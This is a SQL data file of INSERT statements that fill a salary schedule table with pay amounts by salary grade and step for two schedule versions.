INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '17', '27736.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '17', '27366.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '17', '27002.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '17', '26644.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '16', '26832.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '16', '26472.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '16', '26117.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '16', '25767.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '16', '25424.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '16', '25085.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '16', '24752.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '15', '24934.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '15', '24598.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '15', '24266.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '15', '23941.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '15', '23621.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '15', '23305.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '15', '22994.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '14', '23041.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '14', '22748.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '14', '22459.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '14', '22174.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '13', '21493.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '13', '21219.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '13', '20948.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '13', '20682.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '13', '20420.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '13', '20168.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '13', '19908.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '12', '19050.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '12', '19793.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '12', '19541.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '12', '19291.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '12', '19047.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '12', '18805.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '12', '18568.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '11', '18703.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '11', '18464.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '11', '18227.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '11', '17994.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '11', '17765.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '11', '17540.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '11', '17318.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '10', '17449.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '10', '17225.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '10', '17003.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '10', '16786.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '10', '16571.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '10', '16360.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '10', '16153.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '9', '16257.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '9', '16048.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '9', '15842.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '9', '15639.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '9', '15439.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '9', '15242.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '9', '15048.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '8', '15138.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '8', '14942.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '8', '14750.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '8', '14561.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '8', '14375.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '8', '14192.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '8', '14011.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '7', '14096.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '7', '13913.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '7', '13734.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '7', '13558.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '7', '13384.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '7', '13213.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '7', '13045.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '6', '13125.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '6', '12955.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '6', '12788.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '6', '12624.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '6', '12462.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '6', '12302.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '6', '12146.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '5', '12197.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '5', '12040.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '5', '11884.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '5', '11732.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '5', '11581.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '5', '11434.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '5', '11288.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '4', '11335.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '4', '11189.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '4', '11045.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '4', '10904.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '4', '10763.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '4', '10626.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '4', '10491.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '3', '10534.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '3', '10398.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '3', '10265.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '3', '10133.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '3', '10004.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '3', '9876.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '3', '9751.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '2', '9772.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '2', '9646.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '2', '9522.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '2', '9400.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '2', '9281.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '2', '9162.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '2', '9047.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '1', '9064.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '1', '8948.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '1', '8834.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '1', '8610.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '1', '8501.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '1', '8393.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '14', '21346.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '1', '8721.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '14', '21618.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '14', '21894.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '1', '9478.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '1', '9568.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '1', '9660.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '1', '9753.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '1', '9846.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '1', '9949.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '1', '10036.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '1', '10132.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '2', '10159.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '2', '10255.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '2', '10351.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '2', '10449.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '2', '10547.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '2', '10647.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '2', '10747.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '2', '10848.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '3', '10883.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '3', '10985.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '3', '11089.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '3', '11193.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '3', '11298.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '3', '11405.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '3', '11621.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '3', '11512.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '4', '11658.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '4', '11767.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '4', '11878.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '4', '11990.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '4', '12103.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '4', '12217.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '4', '12333.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '4', '12448.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '5', '12488.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '5', '12644.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '5', '12725.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '5', '12844.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '5', '12965.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '5', '13087.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '5', '13211.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '5', '13335.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '6', '13378.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '6', '13504.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '6', '13630.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '6', '13759.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '6', '13889.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '6', '14020.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '6', '14152.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '6', '14285.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '7', '14331.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '7', '14466.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '7', '14602.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '7', '14740.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '7', '14878.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '7', '15018.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '7', '15159.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '7', '15303.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '8', '15368.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '8', '15519.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '8', '15670.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '8', '15823.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '8', '15978.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '8', '16133.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '8', '16291.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '8', '16450.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '9', '16512.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '9', '16671.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '9', '16830.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '9', '16992.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '9', '17155.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '9', '17319.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '9', '17485.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '9', '17653.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '10', '17730.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '10', '17900.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '10', '18071.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '10', '18245.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '10', '18420.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '10', '18634.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '10', '18775.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '10', '18955.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '11', '19077.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '11', '19286.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '11', '19496.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '11', '19709.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '11', '19925.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '11', '20142.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '11', '20362.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '11', '20585.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '12', '20651.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '12', '20870.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '12', '21091.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '12', '21315.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '12', '21540.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '12', '21769.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '12', '21999.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '12', '22232.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '13', '22328.00', '4');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '13', '22564.00', '4');
